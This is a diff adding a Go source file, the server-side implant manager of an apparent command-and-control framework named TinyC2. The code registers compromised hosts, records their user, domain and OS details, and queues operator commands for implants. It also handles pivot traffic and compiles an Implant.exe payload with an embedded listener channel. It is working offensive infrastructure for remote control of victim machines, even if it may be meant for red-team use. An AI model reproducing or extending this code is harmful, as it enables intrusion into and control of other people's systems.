@@ -1,0 +1,318 @@
+package implant
+
+import (
+	"encoding/json"
+	"errors"
+	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strconv"
+	"strings"
+
+	"github.com/0xPrimo/TinyC2/server/internal/listener"
+	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
+	"github.com/0xPrimo/TinyC2/server/internal/pkg/store"
+)
+
+type Manager struct {
+	implants *store.Store[string, *Implant]
+	commands *store.Store[string, Command]
+	listener.IListenerManager
+}
+
+func NewManager(listenerManager listener.IListenerManager) *Manager {
+	manager := &Manager{
+		implants:         store.NewStore[string, *Implant](),
+		commands:         store.NewStore[string, Command](),
+		IListenerManager: listenerManager,
+	}
+
+	manager.registerCommands()
+	return manager
+}
+
+func (m *Manager) ImplantExecute(id string, name string, args ...string) error {
+	// does implant exists
+	implant, ok := m.implants.Get(id)
+	if !ok {
+		return fmt.Errorf("implant not found with id: %s", id)
+	}
+
+	cmd, ok := m.commands.Get(name)
+	if !ok {
+		return fmt.Errorf("command not found: %s", name)
+	}
+
+	if len(args)-1 < cmd.NumberOfArguments {
+		return fmt.Errorf("invalid number of arguments: expected %d, got %d", cmd.NumberOfArguments, len(args)-1)
+	}
+
+	task, err := cmd.execute(m, id, args...)
+	if err != nil {
+		return err
+	}
+
+	// add task to implant queue
+	implant.TaskAdd(task)
+
+	return nil
+}
+
+func (m *Manager) ImplantProcess(listener string, data []byte) ([]byte, error) {
+	packet, err := m.parse(data)
+	if err != nil {
+		return nil, err
+	}
+
+	// register implant if not
+	implant, ok := m.implants.Get(packet.ID)
+	if !ok {
+		return m.register(packet.ID, listener, packet.TaskResult)
+	}
+
+	// update timer
+	implant.TimerUpdate()
+
+	// handle implant task result
+	for _, result := range packet.TaskResult {
+		cmd, ok := m.commands.Get(result.Cmd)
+		if !ok {
+			logger.Error("command not found: %s", result.Cmd)
+			continue
+		}
+
+		cmd.process(m, packet.ID, result)
+	}
+
+	return m.response(packet.ID)
+}
+
+func (m *Manager) ImplantGenerate(listenerName string) ([]byte, error) {
+	extension, err := m.ListenerExtension(listenerName)
+	if err != nil {
+		return nil, err
+	}
+
+	src, _ := filepath.Abs("../implant")
+	binary, err := buildCmakeProject(src, extension)
+	if err != nil {
+		return nil, err
+	}
+
+	return binary, nil
+}
+
+func (m *Manager) ImplantExists(id string) bool {
+	_, ok := m.implants.Get(id)
+	return ok
+}
+
+func (m *Manager) ImplantList() []Implant {
+	var implants []Implant
+	m.implants.ForEach(func(id string, implant *Implant) {
+		implants = append(implants, *implant)
+	})
+	return implants
+}
+
+func (m *Manager) ImplantCommandList() []Command {
+	return CommandList
+}
+
+func (m *Manager) ImplantChannelList(id string) ([]Channel, bool) {
+	var channels []Channel
+
+	implant, ok := m.implants.Get(id)
+	if !ok {
+		return channels, false
+	}
+
+	return implant.ChannelList(), true
+}
+
+// pivot
+func (m *Manager) pivot(data []byte) {
+	resp, err := m.parse(data)
+	if err != nil {
+		logger.Error(err.Error())
+		return
+	}
+
+	for _, result := range resp.TaskResult {
+		cmd, ok := m.commands.Get(result.Cmd)
+		if !ok {
+			logger.Error("command not found: %s", result.Cmd)
+			continue
+		}
+
+		cmd.process(m, resp.ID, result)
+	}
+}
+
+// response
+func (m *Manager) response(id string) ([]byte, error) {
+	implant, ok := m.implants.Get(id)
+	if !ok {
+		return nil, fmt.Errorf("implant with id %s not found", id)
+	}
+
+	return m.pack(implant.TaskPopAll())
+}
+
+// register
+func (m *Manager) register(id string, listener string, results []TaskResult) ([]byte, error) {
+	var checkin map[string]any
+
+	if len(results) == 0 {
+		return nil, fmt.Errorf("implant response packet doesn't have task result")
+	}
+
+	err := json.Unmarshal(results[0].Artifact, &checkin)
+	if err != nil {
+		return nil, err
+	}
+
+	// initialize channel object
+	implant := NewImplant(id)
+
+	// add implant built in channel
+	implant.ChannelAdd(listener, &Channel{
+		Name:     listener,
+		Fallback: true,
+		InUse:    true,
+	})
+
+	// add implant metadata
+	implant.MetaUpdate(map[string]any{
+		"pid":    checkin["pid"],
+		"host":   checkin["host"],
+		"user":   checkin["user"],
+		"domain": checkin["domain"],
+		"os":     checkin["os"],
+	})
+
+	// save implant
+	m.implants.Set(id, implant)
+
+	magic := map[string]any{
+		"magic": "baadf00d",
+	}
+
+	data, err := json.Marshal(magic)
+	if err != nil {
+		return nil, err
+	}
+
+	return data, nil
+}
+
+// parse
+func (m *Manager) parse(data []byte) (Packet, error) {
+	var raw rawPacket
+	if err := json.Unmarshal(data, &raw); err != nil {
+		return Packet{}, fmt.Errorf("unmarshal packet: %w", err)
+	}
+
+	// Validate required fields
+	if raw.ID == nil {
+		return Packet{}, errors.New("invalid packet: missing id")
+	}
+
+	// Scalable: Pre-allocate slice capacity to handle 0, 1, or N tasks efficiently
+	results := make([]TaskResult, 0, len(raw.Tasks))
+	for _, t := range raw.Tasks {
+		results = append(results, TaskResult{
+			Cmd:      t.Name,
+			Status:   t.Status,
+			Output:   t.Output,
+			Artifact: []byte(t.Artifact),
+		})
+	}
+
+	return Packet{
+		ID:         strconv.FormatUint(*raw.ID, 16),
+		TaskResult: results,
+	}, nil
+
+}
+
+// pack
+func (m *Manager) pack(tasks []Task) ([]byte, error) {
+
+	var (
+		packet []any
+	)
+
+	for _, task := range tasks {
+		t := map[string]any{
+			"name": task.Cmd,
+			"args": task.Args,
+		}
+
+		if len(task.Artifacts) > 0 {
+			t["artifact"] = string(task.Artifacts[0].Data)
+		}
+
+		packet = append(packet, t)
+	}
+
+	data, err := json.Marshal(packet)
+	if err != nil {
+		return nil, err
+	}
+
+	return data, nil
+}
+
+// registerCommands
+func (m *Manager) registerCommands() {
+	for _, cmd := range CommandList {
+		m.commands.Set(cmd.Name, cmd)
+	}
+}
+
+// build implant payload
+func buildCmakeProject(src string, extension []byte) ([]byte, error) {
+	os.MkdirAll(src+"/build", 0o755)
+
+	args := []string{
+		"-S", src,
+		"-B", src + "/build",
+		"-DDEFAULT_CHANNEL=" + toCArray(extension),
+	}
+
+	cmd := exec.Command("cmake", args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Run(); err != nil {
+		logger.Error("configuration failed: %v", err)
+		return nil, err
+	}
+
+	args = []string{"--build", src + "/build"}
+	cmd = exec.Command("cmake", args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Run(); err != nil {
+		logger.Error("configuration failed: %v", err)
+		return nil, err
+	}
+
+	data, err := os.ReadFile(src + "/build/Implant.exe")
+	if err != nil {
+		return nil, fmt.Errorf("failed to read implant exe: %w", err)
+	}
+
+	return data, nil
+}
+
+func toCArray(data []byte) string {
+	bytes := make([]string, len(data)+1)
+
+	for i, b := range data {
+		bytes[i] = fmt.Sprintf("0x%02x", b)
+	}
+
+	return "{" + strings.Join(bytes, ", ") + "}"
+}
